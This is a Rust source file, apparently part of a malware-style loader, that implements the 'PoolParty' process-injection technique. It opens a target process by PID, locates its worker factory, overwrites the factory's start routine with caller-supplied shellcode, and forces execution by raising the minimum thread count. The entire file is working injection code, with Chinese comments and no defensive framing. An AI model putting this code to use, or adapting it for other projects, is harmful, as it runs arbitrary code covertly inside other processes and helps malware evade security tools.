
use crate::loader::poolparty::common::*;
use winapi::shared::ntdef::NT_SUCCESS;
use std::fmt;

// 自定义错误类型
#[derive(Debug)]
pub(crate) struct InjectionError {
    pub reason: String,
}

impl fmt::Display for InjectionError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "Injection failed: {}", self.reason)
    }
}

impl std::error::Error for InjectionError {}

impl InjectionError {
    pub fn new(reason: &str) -> Self {
        InjectionError {
            reason: reason.to_string(),
        }
    }
}

// 修改函数签名，不返回任何字符串，只返回 Result
pub(crate) fn party_time_1(shellcode: &[u8], pid: u32) -> Result<(), InjectionError> {
    // Get handle to target process
    let process_handle = get_target_process_handle(pid);
    if process_handle.is_null() {
        return Err(InjectionError::new(&format!("Failed to open process {}", pid)));
    }

    // Find worker factory handle
    let worker_factory_handle = find_worker_factory_handle(process_handle)
        .map_err(|status| {
            InjectionError::new(&format!("Failed to find worker factory handle. Status: {:#x}", status))
        })?;

    // Get worker factory basic info
    let worker_factory_basic_info = get_worker_factory_basic_info(worker_factory_handle)
        .map_err(|status| {
            InjectionError::new(&format!("Failed to get worker factory basic info. Status: {:#x}", status))
        })?;

    // Write shellcode to the existing start routine address
    let status = write_shellcode_to_memory(
        process_handle, 
        worker_factory_basic_info.StartRoutine as *mut winapi::ctypes::c_void, 
        shellcode
    );
    
    if !NT_SUCCESS(status) {
        return Err(InjectionError::new(&format!(
            "Failed to write shellcode to address {:p}. Status: {:x}", 
            worker_factory_basic_info.StartRoutine, status
        )));
    }

    // Trigger execution by increasing minimum thread count
    let status = setup_execution(worker_factory_handle, &worker_factory_basic_info);
    
    if !NT_SUCCESS(status) {
        return Err(InjectionError::new(&format!(
            "Failed to trigger shellcode execution. Status: {:x}", 
            status
        )));
    }

    Ok(())
}